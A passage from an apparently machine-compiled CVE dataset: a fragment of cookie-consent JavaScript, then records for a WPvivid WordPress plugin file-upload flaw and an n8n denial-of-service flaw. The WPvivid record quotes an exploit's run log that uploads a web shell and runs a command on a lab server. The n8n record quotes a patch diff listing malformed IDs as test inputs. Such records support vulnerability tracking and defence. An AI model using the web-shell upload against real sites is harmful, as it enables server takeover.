7eNN/RjowfCYiFoDUFer1S3gW6JiJ8Nt30EMbEhU+vzSIztuRYjRLsR8IHLjlf7HZ+MrWWEXxNmbvapt4jGSqZRYSkGUetSNTPzHsui5YMQ2ajJUNks6mw4wT54Ok2ShnzzIPCUGshzawCRKy5FqvrTZe0RWzQGvw79m67XZjKmxJrLsICjtZa55gxXy+6F4sYsEtxTqhXdRTLC8ulSDaWoCLsolfN+8YUhOsJV709H7Cudr0LlVEtzqBcN+shEyThdR941OnAbF8pirKJqXyupTRTtQSReiVmXW1j7oBErB0d9xM2WEd5J9ZKYtuR4WKwwBSoORbpGrJ5ZI9lt71irJmGX1px0JYE26uNErawr2zfIcP4OHEKXm66PA3wjpCNEfpJunI4muifPjKvsFCkGjExTq63yxMJsZNMYF/J4HmDC5A3Yq36jy0ClePHVhwuu/b1HSFlEfHD5ZtD1bEK44Qu1mWys6tbWmZyPWckzlPTGiRw/XHCuk+q4Rek+mVrVL/UppwrdDEGNV2kpyuhccgc5Oxm9vWnn+19vJrVpLor0kTUrGacMplb1CfOFyTD4o9uNrHqr2Z+ZMSp1c2XcVSORnh9Q81q3k599ETgkNnjg0nGzi10K7rX+bZpHbrblPcY5A4Zxk2xcjzCvTpd9027Aa0QtouyyrKFRR6D/04DwkFGvHPXM3Qda/Jb4nPgI7hQLVM1q5HIBt2MzQNa57Z1DiiLAGa5Mi+O4Sz3Mpp6laPHO6InII3ITnX1QtI+EOX+m9ZxleOZ/j9PiuKoLi3aqXPuEoSye/Vhkm+LalbLtHhMS0R6zu7aZ3vP2jOjL7QVv4McxhcDnZIelAQibGIbULOapf3PuE1Vs9qeaOTdkVKr00gCQiw4NlBzDvf1Lxx+uP5r3Dgv5KQZRzWn+GRwz8jmDS8itUg7iB6vLuJCF5Uty4A9mVKkFR6MiJDachST/oHvHgD+B4SoUIitpF05AAAAAElFTkSuQmCC")+'" alt="'+tarteaucitron.lang.icon+" "+tarteaucitron.lang.modalWindow+'" title="'+tarteaucitron.lang.icon+" "+tarteaucitron.lang.modalWindow+'">';html+="   </button>";html+="</div>"}if(tarteaucitron.parameters.showAlertSmall===true){html+='<div id="tarteaucitronAlertSmall" class="tarteaucitronAlertSmall'+orientation+'">';html+='   <button type="button" id="tarteaucitronManager" aria-label="'+tarteaucitron.lang.alertSmall+" "+tarteaucitron.lang.modalWindow+'" title="'+tarteaucitron.lang.alertSmall+" "+tarteaucitron.lang.modalWindow+'">';html+="       "+tarteaucitron.lang.alertSmall;html+='       <span id="tarteaucitronDot">';html+='           <span id="tarteaucitronDotGreen"></span>';html+='           <span id="tarteaucitronDotYellow"></span>';html+='           <span id="tarteaucitronDotRed"></span>';html+="       </span>";if(tarteaucitron.parameters.cookieslist===true){html+="   </button>\x3c!-- @whitespace";html+='   --\x3e<button type="button" id="tarteaucitronCookiesNumber" aria-expanded="false" aria-controls="tarteaucitronCookiesListContainer">0</button>';html+='   <div id="tarteaucitronCookiesListContainer">';if(tarteaucitron.reloadThePage){html+='       <button type="button" id="tarteaucitronClosePanelCookie" aria-label="'+tarteaucitron.lang.close+" ("+tarteaucitron.lang.reload+')" title="'+tarteaucitron.lang.close+" ("+tarteaucitron.lang.reload+')">'}else{html+='       <button type="button" id="tarteaucitronClosePanelCookie">'}html+="           "+tarteaucitron.lang.close;html+="       </button>";html+='       <div class="tarteaucitronCookiesListMain" id="tarteaucitronCookiesTitle">';html+='            <span class="tarteaucitronH2" role="heading" aria-level="3" id="tarteaucitronCookiesNumberBis">0 cookie</span>';html+="       </div>";html+='       <div id="tarteaucitronCookiesList"></div>';html+="    </div>"}else{html+="   </div>"}html+="</div>"}tarteaucitron.addInternalScript(tarteaucitron.cdn+"advertising"+(useMinifiedJS?".min":"")+".js","",function(){if(tarteaucitronNoAdBlocker===true||tarteaucitron.parameters.adblocker===false){div.id="tarteaucitronRoot";if(tarteaucitron.parameters.bodyPosition==="top"){var bodyFirstChild=body.firstChild;body.insertBefore(div,bodyFirstChild)}else{body.appendChild(div,body)}div.setAttribute("data-nosnippet","true");div.setAttribute("lang",language);div.setAttribute("role","region");div.setAttribute("aria-labelledby","tac_title");div.innerHTML=html;var tacRootAvailableEvent;if(typeof Event==="function"){tacRootAvailableEvent=new Event("tac.root_available")}else if(typeof document.createEvent==="function"){tacRootAvailableEvent=document.createEvent("Event");tacRootAvailableEvent.initEvent("tac.root_available",true,true)}if(typeof window.dispatchEvent==="function"){window.dispatchEvent(tacRootAvailableEvent)}if(tarteaucitron.job!==undefined){tarteaucitron.job=tarteaucitron.cleanArray(tarteaucitron.job);for(index=0;index<tarteaucitron.job.length;index+=1){tarteaucitron.addService(tarteaucitron.job[index])}}else{tarteaucitron.job=[]}if(tarteaucitron.job.length===0){tarteaucitron.userInterface.closeAlert()}tarteaucitron.isAjax=true;tarteaucitron.job.push=function(id){if(typeof tarteaucitron.job.indexOf==="undefined"){tarteaucitron.job.indexOf=function(obj,start){var i,j=this.length;for(i=start||0;i<j;i+=1){if(this[i]===obj){return i}}return-1}}if(tarteaucitron.job.indexOf(id)===-1){Array.prototype.push.call(this,id)}tarteaucitron.launch[id]=false;tarteaucitron.addService(id)};if(document.location.hash===tarteaucitron.hashtag&&tarteaucitron.hashtag!==""){tarteaucitron.userInterface.openPanel()}tarteaucitron.cookie.number();setInterval(tarteaucitron.cookie.number,6e4)}},tarteaucitron.parameters.adblocker);if(tarteaucitron.parameters.adblocker===true){setTimeout(function(){if(tarteaucitronNoAdBlocker===false){html='<div id="tarteaucitronAlertBig" class="tarteaucitronAlertBig'+orientation+' tarteaucitron-display-block" role="alert" aria-live="polite">';html+='   <p id="tarteaucitronDisclaimerAlert">';html+="       "+tarteaucitron.lang.adblock+"<br/>";html+="       <strong>"+tarteaucitron.lang.adblock_call+"</strong>";html+="   </p>";html+='   <button type="button" class="tarteaucitronCTAButton" id="tarteaucitronCTAButton">';html+="       "+tarteaucitron.lang.reload;html+="   </button>";html+="</div>";html+='<div role="heading" aria-level="2" id="tac_title" class="tac_visually-hidden">'+tarteaucitron.lang.title+"</div>";html+='<div id="tarteaucitronPremium"></div>';div.id="tarteaucitronRoot";if(tarteaucitron.parameters.bodyPosition==="top"){var bodyFirstChild=body.firstChild;body.insertBefore(div,bodyFirstChild)}else{body.appendChild(div,body)}div.setAttribute("data-nosnippet","true");div.setAttribute("lang",language);div.setAttribute("role","region");div.setAttribute("aria-labelledby","tac_title");div.innerHTML=html}},1500)}if(tarteaucitron.parameters.closePopup===true){setTimeout(function(){var closeElement=document.getElementById("tarteaucitronAlertBig"),closeButton=document.createElement("button");if(closeElement){closeButton.innerHTML='<span aria-hidden="true">X</span><span class="tac_visually-hidden">'+tarteaucitron.lang.closeBanner+"</span>";closeButton.setAttribute("id","tarteaucitronCloseCross");closeElement.insertAdjacentElement("beforeend",closeButton)}},100)}if(tarteaucitron.parameters.groupServices===true){var tac_group_style=document.createElement("style");tac_group_style.innerHTML=".tarteaucitronTitle{display:none}";document.head.appendChild(tac_group_style);var cats=document.querySelectorAll('[id^="tarteaucitronServicesTitle_"]');Array.prototype.forEach.call(cats,function(item){var cat=item.getAttribute("id").replace(/^(tarteaucitronServicesTitle_)/,"");if(cat!=="mandatory"){var html="";html+='<li  class="tarteaucitronLine">';html+='   <div class="tarteaucitronName">';html+='       <span class="tarteaucitronH3" role="heading" aria-level="3">'+tarteaucitron.lang[cat].title+"</span>";html+="       <span>"+tarteaucitron.lang[cat].details+"</span>";html+='   <button type="button" aria-expanded="false" class="tarteaucitron-toggle-group" id="tarteaucitron-toggle-group-'+cat+'">'+tarteaucitron.lang.alertSmall+' <span id="tarteaucitronCounter-'+cat+'"></span></button>';html+="   </div>";html+='   <div class="tarteaucitronAsk" id="tarteaucitron-group-'+cat+'">';html+='       <button type="button" aria-label="'+tarteaucitron.lang.allow+" "+tarteaucitron.lang[cat].title+'" class="tarteaucitronAllow" id="tarteaucitron-accept-group-'+cat+'">';html+='           <span class="tarteaucitronCheck" aria-hidden="true"></span> '+tarteaucitron.lang.allow;html+="       </button> ";html+='       <button type="button" aria-label="'+tarteaucitron.lang.deny+" "+tarteaucitron.lang[cat].title+'" class="tarteaucitronDeny" id="tarteaucitron-reject-group-'+cat+'">';html+='           <span class="tarteaucitronCross" aria-hidden="true"></span> '+tarteaucitron.lang.deny;html+="       </button>";html+="   </div>";html+="</li>";var ul=document.createElement("ul");ul.innerHTML=html;item.insertBefore(ul,item.querySelector("#tarteaucitronServices_"+cat+""));document.querySelector("#tarteaucitronServices_"+cat).style.display="none";tarteaucitron.addClickEventToId("tarteaucitron-toggle-group-"+cat,function(){tarteaucitron.userInterface.toggle("tarteaucitronServices_"+cat);if(document.getElementById("tarteaucitronServices_"+cat).style.display=="block"){tarteaucitron.userInterface.addClass("tarteaucitronServicesTitle_"+cat,"tarteaucitronIsExpanded");document.getElementById("tarteaucitron-toggle-group-"+cat).setAttribute("aria-expanded","true")}else{tarteaucitron.userInterface.removeClass("tarteaucitronServicesTitle_"+cat,"tarteaucitronIsExpanded");document.getElementById("tarteaucitron-toggle-group-"+cat).setAttribute("aria-expanded","false")}});tarteaucitron.addClickEventToId("tarteaucitron-accept-group-"+cat,function(){tarteaucitron.userInterface.respondAll(true,cat)});tarteaucitron.addClickEventToId("tarteaucitron-reject-group-"+cat,function(){tarteaucitron.userInterface.respondAll(false,cat)})}})}if(tarteaucitron.parameters.partnersList===true&&(tarteaucitron.parameters.orientation==="middle"||tarteaucitron.parameters.orientation==="popup")){setTimeout(function(){var tacPartnersInfoParent=document.getElementById("tarteaucitronDisclaimerAlert");if(tacPartnersInfoParent!==null){tacPartnersInfoParent.insertAdjacentHTML("beforeend",'<div class="tarteaucitronPartnersList"><b>'+tarteaucitron.lang.ourpartners+' <span id="tarteaucitronCounter-all"></span></b> <ul id="tarteaucitronCounter-list"></ul></div>')}},100)}setTimeout(function(){var tacSaveButtonParent=document.getElementById("tarteaucitronServices");if(tacSaveButtonParent!==null){tacSaveButtonParent.insertAdjacentHTML("beforeend",'<div id="tarteaucitronSave"><button class="tarteaucitronAllow" id="tarteaucitronSaveButton">'+tarteaucitron.lang.save+"</button></div>")}},100);tarteaucitron.userInterface.color("",true);setTimeout(function(){tarteaucitron.addClickEventToId("tarteaucitronCloseCross",function(){tarteaucitron.userInterface.closeAlert()});tarteaucitron.addClickEventToId("tarteaucitronPersonalize",function(){tarteaucitron.userInterface.openPanel()});tarteaucitron.addClickEventToId("tarteaucitronPersonalize2",function(){tarteaucitron.userInterface.respondAll(true)});tarteaucitron.addClickEventToId("tarteaucitronManager",function(){tarteaucitron.userInterface.openPanel()});tarteaucitron.addClickEventToId("tarteaucitronBack",function(){tarteaucitron.userInterface.closePanel()});tarteaucitron.addClickEventToId("tarteaucitronClosePanel",function(){tarteaucitron.userInterface.closePanel()});tarteaucitron.addClickEventToId("tarteaucitronClosePanelCookie",function(){tarteaucitron.userInterface.closePanel()});tarteaucitron.addClickEventToId("tarteaucitronPrivacyUrl",function(){document.location=tarteaucitron.parameters.privacyUrl});tarteaucitron.addClickEventToId("tarteaucitronPrivacyUrlDialog",function(){document.location=tarteaucitron.parameters.privacyUrl});tarteaucitron.addClickEventToId("tarteaucitronCookiesNumber",function(){tarteaucitron.userInterface.toggleCookiesList()});tarteaucitron.addClickEventToId("tarteaucitronAllAllowed",function(){tarteaucitron.userInterface.respondAll(true)});tarteaucitron.addClickEventToId("tarteaucitronAllDenied",function(){tarteaucitron.userInterface.respondAll(false)});tarteaucitron.addClickEventToId("tarteaucitronAllDenied2",function(){tarteaucitron.userInterface.respondAll(false,"",true);if(tarteaucitron.reloadThePage===true){window.location.reload()}});tarteaucitron.addClickEventToId("tarteaucitronCloseAlert",function(){tarteaucitron.userInterface.openPanel()});tarteaucitron.addClickEventToId("tarteaucitronCTAButton",function(){location.reload()});tarteaucitron.addClickEventToId("tarteaucitronSaveButton",function(){var timeoutSaveButton=0;tarteaucitron.job.forEach(function(id){if(tarteaucitron.state[id]!==true&&tarteaucitron.state[id]!==false){timeoutSaveButton=500;tarteaucitron.setConsent(id,false)}});setTimeout(tarteaucitron.userInterface.closePanel,timeoutSaveButton)});var toggleBtns=document.getElementsByClassName("catToggleBtn"),i;for(i=0;i<toggleBtns.length;i++){toggleBtns[i].dataset.index=i;tarteaucitron.addClickEventToElement(toggleBtns[i],function(){if(!tarteaucitron.parameters.showDetailsOnClick)return false;tarteaucitron.userInterface.toggle("tarteaucitronDetails"+cat[this.dataset.index],"tarteaucitronInfoBox");if(document.getElementById("tarteaucitronDetails"+cat[this.dataset.index]).style.display==="block"){this.setAttribute("aria-expanded","true")}else{this.setAttribute("aria-expanded","false")}return false})}var allowBtnsInSite=document.querySelectorAll(".tac_activate .tarteaucitronAllow");for(i=0;i<allowBtnsInSite.length;i++){tarteaucitron.addClickEventToElement(allowBtnsInSite[i],function(){if(this.closest(".tac_activate")!==null&&this.closest(".tac_activate").parentNode!==null){this.closest(".tac_activate").parentNode.setAttribute("tabindex","-1");this.closest(".tac_activate").parentNode.focus()}})}var allowBtns=document.getElementsByClassName("tarteaucitronAllow");for(i=0;i<allowBtns.length;i++){tarteaucitron.addClickEventToElement(allowBtns[i],function(){tarteaucitron.userInterface.respond(this,true)})}var denyBtns=document.getElementsByClassName("tarteaucitronDeny");for(i=0;i<denyBtns.length;i++){tarteaucitron.addClickEventToElement(denyBtns[i],function(){tarteaucitron.userInterface.respond(this,false)})}if(tarteaucitron.events.load){tarteaucitron.events.load()}},500)})})},addService:function(serviceId){"use strict";var html="",s=tarteaucitron.services,service=s[serviceId];if(typeof service==="undefined"){var serviceToRemoveIndex=tarteaucitron.job.indexOf(serviceId);if(serviceToRemoveIndex!==-1){tarteaucitron.job.splice(serviceToRemoveIndex,1)}return}if(tarteaucitron.parameters.alwaysNeedConsent===true){service.needConsent=true}var cookie=tarteaucitron.cookie.read(),hostname=document.location.hostname,hostRef=document.referrer.split("/")[2],isNavigating=hostRef===hostname&&window.location.href!==tarteaucitron.parameters.privacyUrl,isAutostart=!service.needConsent,isWaiting=cookie.indexOf(service.key+"=wait")>=0,isDenied=cookie.indexOf(service.key+"=false")>=0,isAllowed=cookie.indexOf(service.key+"=true")>=0||!service.needConsent&&cookie.indexOf(service.key+"=false")<0,isResponded=cookie.indexOf(service.key+"=false")>=0||cookie.indexOf(service.key+"=true")>=0,isDNTRequested=navigator.doNotTrack==="1"||navigator.doNotTrack==="yes"||navigator.msDoNotTrack==="1"||window.doNotTrack==="1",currentStatus=isAllowed?tarteaucitron.lang.allowed:tarteaucitron.lang.disallowed,state=undefined!==service.defaultState?service.defaultState:undefined!==tarteaucitron.parameters.serviceDefaultState?tarteaucitron.parameters.serviceDefaultState:"wait";if(tarteaucitron.added[service.key]!==true){tarteaucitron.added[service.key]=true;html+='<li id="'+service.key+'Line" class="tarteaucitronLine">';html+='   <div class="tarteaucitronName">';html+='       <span class="tarteaucitronH3" role="heading" aria-level="4">'+service.name+"</span>";html+='       <div class="tarteaucitronStatusInfo">';html+='          <span class="tacCurrentStatus" id="tacCurrentStatus'+service.key+'">'+currentStatus+"</span>";html+='          <span class="tarteaucitronReadmoreSeparator"> - </span>';html+='          <span id="tacCL'+service.key+'" class="tarteaucitronListCookies"></span>';html+="       </div>";if(tarteaucitron.parameters.moreInfoLink==true){var link="https://tarteaucitron.io/service/"+service.key+"/";if(service.readmoreLink!==undefined&&service.readmoreLink!==""){link=service.readmoreLink}if(tarteaucitron.parameters.readmoreLink!==undefined&&tarteaucitron.parameters.readmoreLink!==""){link=tarteaucitron.parameters.readmoreLink}html+='       <a href="'+link+'" target="_blank" rel="noreferrer noopener nofollow" title="'+tarteaucitron.lang.more+" : "+tarteaucitron.lang.cookieDetail+" "+service.name+" "+tarteaucitron.lang.ourSite+" "+tarteaucitron.lang.newWindow+'" class="tarteaucitronReadmoreInfo">'+tarteaucitron.lang.more+"</a>";html+='       <span class="tarteaucitronReadmoreSeparator"> - </span>';html+='       <a href="'+service.uri+'" target="_blank" rel="noreferrer noopener" title="'+tarteaucitron.lang.source+" "+service.name+" "+tarteaucitron.lang.newWindow+'" class="tarteaucitronReadmoreOfficial">'+tarteaucitron.lang.source+"</a>"}html+="   </div>";html+='   <div class="tarteaucitronAsk">';html+='       <button type="button" aria-label="'+tarteaucitron.lang.allow+" "+service.name+'" id="'+service.key+'Allowed" class="tarteaucitronAllow">';html+='           <span class="tarteaucitronCheck" aria-hidden="true"></span> '+tarteaucitron.lang.allow;html+="       </button> ";html+='       <button type="button" aria-label="'+tarteaucitron.lang.deny+" "+service.name+'" id="'+service.key+'Denied" class="tarteaucitronDeny">';html+='           <span class="tarteaucitronCross" aria-hidden="true"></span> '+tarteaucitron.lang.deny;html+="       </button>";html+="   </div>";html+="</li>";tarteaucitron.userInterface.css("tarteaucitronServicesTitle_"+service.type,"display","block");if(document.getElementById("tarteaucitronServices_"+service.type)!==null){document.getElementById("tarteaucitronServices_"+service.type).innerHTML+=html}tarteaucitron.userInterface.css("tarteaucitronNoServicesTitle","display","none");tarteaucitron.userInterface.order(service.type);tarteaucitron.addClickEventToId(service.key+"Allowed",function(){tarteaucitron.userInterface.respond(this,true)});tarteaucitron.addClickEventToId(service.key+"Denied",function(){tarteaucitron.userInterface.respond(this,false)})}tarteaucitron.pro("!"+service.key+"="+isAllowed);if(isResponded===false&&tarteaucitron.user.bypass===true){isAllowed=true;tarteaucitron.cookie.create(service.key,true)}if(!isResponded&&(isAutostart||isNavigating&&isWaiting)&&!tarteaucitron.highPrivacy||isAllowed){if(!isAllowed||!service.needConsent&&cookie.indexOf(service.key+"=false")<0){tarteaucitron.cookie.create(service.key,true)}if(tarteaucitron.launch[service.key]!==true){tarteaucitron.launch[service.key]=true;if((typeof tarteaucitronMagic==="undefined"||tarteaucitronMagic.indexOf("_"+service.key+"_")<0)&&tarteaucitron.parameters.serverSide!==true){service.js()}tarteaucitron.sendEvent(service.key+"_loaded")}tarteaucitron.state[service.key]=true;tarteaucitron.userInterface.color(service.key,true)}else if(isDenied){if(typeof service.fallback==="function"){if((typeof tarteaucitronMagic==="undefined"||tarteaucitronMagic.indexOf("_"+service.key+"_")<0)&&tarteaucitron.parameters.serverSide!==true){service.fallback()}}tarteaucitron.state[service.key]=false;tarteaucitron.userInterface.color(service.key,false)}else if(!isResponded&&isDNTRequested&&tarteaucitron.handleBrowserDNTRequest){tarteaucitron.cookie.create(service.key,"false");if(typeof service.fallback==="function"){if((typeof tarteaucitronMagic==="undefined"||tarteaucitronMagic.indexOf("_"+service.key+"_")<0)&&tarteaucitron.parameters.serverSide!==true){service.fallback()}}tarteaucitron.state[service.key]=false;tarteaucitron.userInterface.color(service.key,false)}else if(!isResponded){tarteaucitron.cookie.create(service.key,state);if((typeof tarteaucitronMagic==="undefined"||tarteaucitronMagic.indexOf("_"+service.key+"_")<0)&&tarteaucitron.parameters.serverSide!==true){if(true===state&&typeof service.js==="function"){service.js()}else if(typeof service.fallback==="function"){service.fallback()}}if(true===state){tarteaucitron.sendEvent(service.key+"_loaded")}if(true===state||false===state){tarteaucitron.state[service.key]=state}tarteaucitron.userInterface.color(service.key,state);if("wait"===state){tarteaucitron.userInterface.openAlert()}}tarteaucitron.cookie.checkCount(service.key);tarteaucitron.sendEvent(service.key+"_added")},sendEvent:function(event_key){if(event_key!==undefined){var send_event_item;if(typeof Event==="function"){send_event_item=new Event(event_key)}else if(typeof document.createEvent==="function"){send_event_item=document.createEvent("Event");send_event_item.initEvent(event_key,true,true)}document.dispatchEvent(send_event_item)}},cleanArray:function cleanArray(arr){"use strict";var i,len=arr.length,out=[],obj={},s=tarteaucitron.services;for(i=0;i<len;i+=1){if(!obj[arr[i]]){obj[arr[i]]={};if(tarteaucitron.services[arr[i]]!==undefined){out.push(arr[i])}}}out=out.sort(function(a,b){if(s[a].type+s[a].key>s[b].type+s[b].key){return 1}if(s[a].type+s[a].key<s[b].type+s[b].key){return-1}return 0});return out},setConsent:function(id,status){if(status===true){tarteaucitron.userInterface.respond(document.getElementById(id+"Allowed"),true)}else if(status===false){tarteaucitron.userInterface.respond(document.getElementById(id+"Denied"),false)}},userInterface:{css:function(id,property,value){"use strict";if(document.getElementById(id)!==null){if(property=="display"&&value=="none"&&(id=="tarteaucitron"||id=="tarteaucitronBack"||id=="tarteaucitronAlertBig")){document.getElementById(id).style["opacity"]="0";document.getElementById(id).style[property]=value}else{document.getElementById(id).style[property]=value;if(property=="display"&&value=="block"&&(id=="tarteaucitron"||id=="tarteaucitronAlertBig")){document.getElementById(id).style["opacity"]="1"}if(property=="display"&&value=="block"&&id=="tarteaucitr
... [truncated]

================================================================================


CVE ID: CVE-2025-5961
Published: 2025-07-03T14:15:33.523
Modified: 2025-07-09T17:51:24.543
CVSS Score: 7.2 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
The Migration, Backup, Staging – WPvivid Backup & Migration plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the 'wpvivid_upload_import_files' function in all versions up to, and including, 0.9.116. This makes it possible for authenticated attackers, with Administrator-level access and above, to upload arbitrary files on the affected site's server which may make remote code execution possible. NOTE: Uploaded files are only accessible on WordPress instances running on the NGINX web server as the existing .htaccess within the target file upload folder prevents access on Apache servers.

References (7):
  1. https://github.com/d0n601/CVE-2025-5961 [Exploit, Third Party Advisory]
  2. https://plugins.trac.wordpress.org/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-export-import.php#L2210 [Product]
  3. https://plugins.trac.wordpress.org/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-export-import.php#L2235 [Product]
  4. https://plugins.trac.wordpress.org/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-export-import.php#L2246 [Product]
  5. https://plugins.trac.wordpress.org/changeset/3320877/ [Patch]
  6. https://ryankozak.com/posts/cve-2025-5961/ [Exploit, Third Party Advisory]
  7. https://www.wordfence.com/threat-intel/vulnerabilities/id/d8ceb4a1-9354-4ed3-9a8f-45ba2057a810?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/d0n601/CVE-2025-5961 ---
wpvivid_upload_import_files

hack.php

<span class="pl-c1"> python3 ./CVE-2025-5961.py https://lab1.hacker admin password</span>
<span class="pl-c1">Logging into: https://lab1.hacker/wp-admin</span>
<span class="pl-c1">Extracting nonce values...</span>
<span class="pl-c1">ajax_nonce: e4d4bec9f0</span>
<span class="pl-c1">Uploading web shell: hack.php</span>
<span class="pl-c1">{"result":"success"}</span>

<span class="pl-c1">Web Shell At: https://lab1.hacker/wp-content/wpvividbackups/ImportandExport/hack.php</span>

<span class="pl-c1">Executing test command: ip addr</span>
<span class="pl-c1">&lt;pre&gt;1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span>
<span class="pl-c1">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span>
<span class="pl-c1">    inet 127.0.0.1/8 scope host lo</span>
<span class="pl-c1">       valid_lft forever preferred_lft forever</span>
<span class="pl-c1">    inet6 ::1/128 scope host </span>
<span class="pl-c1">       valid_lft forever preferred_lft forever</span>
<span class="pl-c1">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span>
<span class="pl-c1">    link/ether 08:00:27:5b:34:2f brd ff:ff:ff:ff:ff:ff</span>
<span class="pl-c1">    altname enp0s3</span>
<span class="pl-c1">    inet 10.0.2.15/24 metric 100 brd 10.0.2.255 scope global dynamic eth0</span>
<span class="pl-c1">       valid_lft 78309sec preferred_lft 78309sec</span>
<span class="pl-c1">    inet6 fd00::a00:27ff:fe5b:342f/64 scope global dynamic mngtmpaddr noprefixroute </span>
<span class="pl-c1">       valid_lft 86105sec preferred_lft 14105sec</span>
<span class="pl-c1">    inet6 fe80::a00:27ff:fe5b:342f/64 scope link </span>
<span class="pl-c1">       valid_lft forever preferred_lft forever</span>
<span class="pl-c1">3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span>
<span class="pl-c1">    link/ether 08:00:27:39:ea:eb brd ff:ff:ff:ff:ff:ff</span>
<span class="pl-c1">    altname enp0s8</span>
<span class="pl-c1">    inet 192.168.56.56/24 brd 192.168.56.255 scope global eth1</span>
<span class="pl-c1">       valid_lft forever preferred_lft forever</span>
<span class="pl-c1">    inet6 fe80::a00:27ff:fe39:eaeb/64 scope link </span>
<span class="pl-c1">       valid_lft forever preferred_lft forever</span>
<span class="pl-c1">4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span>
<span class="pl-c1">    link/ether 02:42:63:2d:a4:f2 brd ff:ff:ff:ff:ff:ff</span>
<span class="pl-c1">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span>
<span class="pl-c1">       valid_lft forever preferred_lft forever</span>
<span class="pl-c1">&lt;/pre&gt;</span>

================================================================================


CVE ID: CVE-2025-49595
Published: 2025-07-03T13:15:28.690
Modified: 2025-09-04T16:49:06.910
CVSS Score: 4.9 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H

CWE Categories:
  - CWE-400: Uncontrolled Resource Consumption

Description:
n8n is a workflow automation platform. Prior to version 1.99.0, there is a denial of Service vulnerability in /rest/binary-data endpoint when processing empty filesystem URIs (filesystem:// or filesystem-v2://). This allows authenticated attackers to cause service unavailability through malformed filesystem URI requests, effecting the /rest/binary-data endpoint and n8n.cloud instances (confirmed HTTP/2 524 timeout responses). Attackers can exploit this by sending GET requests with empty filesystem URIs (filesystem:// or filesystem-v2://) to the /rest/binary-data endpoint, causing resource exhaustion and service disruption. This issue has been patched in version 1.99.0.

References (3):
  1. https://github.com/n8n-io/n8n/commit/43c52a8b4f844e91b02e3cc9df92826a2d7b6052 [Patch]
  2. https://github.com/n8n-io/n8n/pull/16229 [Patch]
  3. https://github.com/n8n-io/n8n/security/advisories/GHSA-pr9r-gxgp-9rm8 [Third Party Advisory, Patch]

Attempting to extract code examples from references...

--- Code from https://github.com/n8n-io/n8n/commit/43c52a8b4f844e91b02e3cc9df92826a2d7b6052 ---
From 43c52a8b4f844e91b02e3cc9df92826a2d7b6052 Mon Sep 17 00:00:00 2001
From: =?UTF-8?q?Iv=C3=A1n=20Ovejero?= <ivov.src@gmail.com>
Date: Fri, 13 Jun 2025 12:53:00 +0200
Subject: [PATCH] fix(core): Prevent DoS via malformed binary data ID (#16229)

---
 .../__tests__/binary-data.controller.test.ts  | 22 +++++++++++++++++--
 .../src/controllers/binary-data.controller.ts | 15 ++++++++++---
 2 files changed, 32 insertions(+), 5 deletions(-)

diff --git a/packages/cli/src/controllers/__tests__/binary-data.controller.test.ts b/packages/cli/src/controllers/__tests__/binary-data.controller.test.ts
index 16d1f04e62794..960e078a2a0f3 100644
--- a/packages/cli/src/controllers/__tests__/binary-data.controller.test.ts
+++ b/packages/cli/src/controllers/__tests__/binary-data.controller.test.ts
@@ -26,7 +26,7 @@ describe('BinaryDataController', () => {
 			await controller.get(request, response, query);
 
 			expect(response.status).toHaveBeenCalledWith(400);
-			expect(response.end).toHaveBeenCalledWith('Missing binary data mode');
+			expect(response.end).toHaveBeenCalledWith('Malformed binary data ID');
 		});
 
 		it('should return 400 if binary data mode is invalid', async () => {
@@ -152,6 +152,24 @@ describe('BinaryDataController', () => {
 			expect(result).toBe(stream);
 			expect(binaryDataService.getAsStream).toHaveBeenCalledWith('filesystem:123');
 		});
+
+		describe('with malicious binary data IDs', () => {
+			it.each([
+				['filesystem:'],
+				['filesystem-v2:'],
+				['filesystem:/'],
+				['filesystem-v2:/'],
+				['filesystem://'],
+				['filesystem-v2://'],
+			])('should return 400 for ID "%s"', async (maliciousId) => {
+				const query = { id: maliciousId, action: 'download' } as BinaryDataQueryDto;
+
+				await controller.get(request, response, query);
+
+				expect(response.status).toHaveBeenCalledWith(400);
+				expect(response.end).toHaveBeenCalledWith('Malformed binary data ID');
+			});
+		});
 	});
 
 	describe('getSigned', () => {
@@ -162,7 +180,7 @@ describe('BinaryDataController', () => {
 			await controller.getSigned(request, response, query);
 
 			expect(response.status).toHaveBeenCalledWith(400);
-			expect(response.end).toHaveBeenCalledWith('Missing binary data mode');
+			expect(response.end).toHaveBeenCalledWith('Malformed binary data ID');
 		});
 
 		it('should return 400 if binary data mode is invalid', async () => {
diff --git a/packages/cli/src/controllers/binary-data.controller.ts b/packages/cli/src/controllers/binary-data.controller.ts
index f6344da6df756..134e4bbf36fe1 100644
--- a/packages/cli/src/controllers/binary-data.controller.ts
+++ b/packages/cli/src/controllers/binary-data.controller.ts
@@ -47,14 +47,23 @@ export class BinaryDataController {
 			throw new BadRequestError('Missing binary data ID');
 		}
 
-		if (!binaryDataId.includes(':')) {
-			throw new BadRequestError('Missing binary data mode');
+		const separatorIndex = binaryDataId.indexOf(':');
+
+		if (separatorIndex === -1) {
+			throw new BadRequestError('Malformed binary data ID');
 		}
 
-		const [mode] = binaryDataId.split(':');
+		const mode = binaryDataId.substring(0, separatorIndex);
+
 		if (!isValidNonDefaultMode(mode)) {
 			throw new BadRequestError('Invalid binary data mode');
 		}
+
+		const path = binaryDataId.substring(separatorIndex + 1);
+
+		if (path === '' || path === '/' || path === '//') {
+			throw new BadRequestError('Malformed binary data ID');
+		}
 	}
 
 	private async setContentHeaders(


================================================================================


CVE ID: CVE-2024-5647
Published: 2025-07-03T10:15:34.527
